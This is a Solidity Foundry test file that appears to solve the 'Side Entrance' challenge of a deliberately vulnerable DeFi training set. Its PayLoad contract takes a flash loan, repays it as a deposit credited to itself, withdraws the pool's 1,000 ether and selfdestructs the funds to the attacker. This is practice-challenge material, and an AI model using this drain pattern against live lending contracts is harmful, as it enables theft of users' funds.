// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "./utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../side-entrance/SideEntranceLenderPool.sol";
interface IsideEntranceLenderPool{
    function flashLoan(uint256) external; 
    function withdraw() external;
    }

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;
    PayLoad internal payload;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;
    }

    function testExploit() public {
        vm.startPrank(attacker);
        payload = new PayLoad(address(sideEntranceLenderPool));
        payload.start();
        vm.stopPrank();
        verfiy();
    }

    function verfiy() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract PayLoad {
    IsideEntranceLenderPool public sideentrancelenderPool;
    constructor (address _target){
        sideentrancelenderPool = IsideEntranceLenderPool(_target);
    }

    function start() public {
        sideentrancelenderPool.flashLoan(1_000e18);
        sideentrancelenderPool.withdraw();
        selfdestruct(payable(msg.sender));
    }
        
    function execute() public payable {
       msg.sender.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
    }

    receive() external payable{}
}
